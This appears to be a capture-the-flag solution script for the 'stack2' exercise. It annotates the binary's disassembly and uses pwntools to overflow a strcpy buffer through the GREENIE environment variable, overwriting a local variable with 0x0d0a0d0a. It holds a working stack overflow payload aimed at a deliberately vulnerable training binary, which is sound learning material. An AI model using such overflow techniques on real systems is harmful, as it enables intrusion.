#   0x08048494 <+0>:	push   ebp
#   0x08048495 <+1>:	mov    ebp,esp
#   0x08048497 <+3>:	and    esp,0xfffffff0
#   0x0804849a <+6>:	sub    esp,0x60
#   0x0804849d <+9>:	mov    DWORD PTR [esp],0x80485e0        # getenv@plt ( [sp + 0x0] = 0x080485e0 → "GREENIE" )
#=> 0x080484a4 <+16>:	call   0x804837c <getenv@plt>
#   0x080484a9 <+21>:	mov    DWORD PTR [esp+0x5c],eax         # Content of GREENIE into the local variable esp+0x5c
#   0x080484ad <+25>:	cmp    DWORD PTR [esp+0x5c],0x0
#   0x080484b2 <+30>:	jne    0x80484c8 <main+52>
#   0x080484b4 <+32>:	mov    DWORD PTR [esp+0x4],0x80485e8
#   0x080484bc <+40>:	mov    DWORD PTR [esp],0x1
#   0x080484c3 <+47>:	call   0x80483bc <errx@plt>
#   0x080484c8 <+52>:	mov    DWORD PTR [esp+0x58],0x0         # esp+0x58 will recv our input from the env variable
#   0x080484d0 <+60>:	mov    eax,DWORD PTR [esp+0x5c]         # GREENIE into eax
#   0x080484d4 <+64>:	mov    DWORD PTR [esp+0x4],eax          # Copy of the contetn into another local variable esp+0x4
#   0x080484d8 <+68>:	lea    eax,[esp+0x18]
#   0x080484dc <+72>:	mov    DWORD PTR [esp],eax
#   0x080484df <+75>:	call   0x804839c <strcpy@plt>
#   0x080484e4 <+80>:	mov    eax,DWORD PTR [esp+0x58]
#   0x080484e8 <+84>:	cmp    eax,0xd0a0d0a                    # Was esp+0x58 overwrite ?
#   0x080484ed <+89>:	jne    0x80484fd <main+105>
#   0x080484ef <+91>:	mov    DWORD PTR [esp],0x8048618        # If yes it's a success
#   0x080484f6 <+98>:	call   0x80483cc <puts@plt>
#   0x080484fb <+103>:	jmp    0x8048512 <main+126>
#   0x080484fd <+105>:	mov    edx,DWORD PTR [esp+0x58]
#   0x08048501 <+109>:	mov    eax,0x8048641
#   0x08048506 <+114>:	mov    DWORD PTR [esp+0x4],edx
#   0x0804850a <+118>:	mov    DWORD PTR [esp],eax
#   0x0804850d <+121>:	call   0x80483ac <printf@plt>           # Otherwise it's a fail
#   0x08048512 <+126>:	leave  
#   0x08048513 <+127>:	ret    
#gef➤  x/s 0x8048618
#0x8048618:	"you have correctly modified the variable"
#gef➤  x/s 0x8048641
#0x8048641:	"Try again, you got 0x%08x\n"

from pwn import *

buff = b'A' * 64
arg = p32(0xd0a0d0a)

payload = buff + arg

sh = process('./stack2', env={'GREENIE': payload})

log.info('Overwriting the local variable esp+0x58 with 0xd0a0d0a')

result = sh.recvline()
print(result.decode())


